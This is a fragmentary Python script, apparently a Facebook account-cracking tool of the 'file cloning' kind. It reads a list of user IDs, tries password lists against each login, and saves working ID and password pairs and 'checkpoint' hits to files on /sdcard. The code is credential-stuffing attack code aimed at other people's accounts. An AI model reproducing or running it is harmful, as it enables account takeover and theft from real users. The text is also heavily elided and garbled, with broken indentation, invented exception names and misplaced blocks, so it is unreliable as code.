#EHC - _ - EHC _-_ON_-_FIRE !¡●●
from os import path
import os,base64,zlib,pip,urllib,time
print('[\033[1;32m✓\033[1;37m] ChecEHC For Update !! ')
time.sleep(1.5)
...
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/groups/2740586426083467/permalink/2740591956082914/?mibextid=Nif5oz/ ')
try:
...
\x1b[38;5;196m╚═════════════╝  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗘𝗠𝗥𝗔𝗡𝄟⃝  \x1b[38;5;196m╚══════════════════╝\033[00m\033[1;30m""")           
  ...
  time.sleep(1)
  print(f"\033[1;37mChecEHC Your Key")
  except:
    sys.exit()
    if name == '__main__':
    	print(logo)
...
def EHC():
	clear()
	#ckx()
	print(f" [\033[1;32mA\033[38;5;46m] 𝗙𝗜𝗟𝗘 𝗖𝗟𝗢𝗡𝗜𝗡𝗚 [𝗘𝗛𝗖 𝗙𝗨𝗟𝗟 𝙒𝙊𝙍𝙆𝙄𝙉𝙂] ")
	...
	if me in ["A", "01","11","A","a"]:
		clear()
		EHC = input(f' [\033[1;32m✓\033[1;37m] 𝗣𝗨𝗧 𝗙𝗜𝗟𝗘 𝗟𝗢𝗖𝗔𝗧𝗜𝗢𝗡 [\033[1;32m❯\033[1;37m] ')
		try:
			fo = open(EHC,'r').read().splitlines()
		except EHCNotFoundError:
			print(f' [\033[1;32mX\033[1;37m] EHC location Not Found ')
			exit()
...
def m1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [EHC] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in EHC:
                                ...
                                print(f'\r\r\033[1;32m [EHC\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/EHC•OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in EHC:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [EHC•CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/EHC•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in EHC:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/EHC•OK•M3.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in EHC:
                                if 'y' in pcp:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in EHC:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/EHC•OK•M2.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in EHC:
                                if 'y' in pcp:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in EHC:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/EHC•OK•M4.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in EHC:
                                if 'y' in pcp:
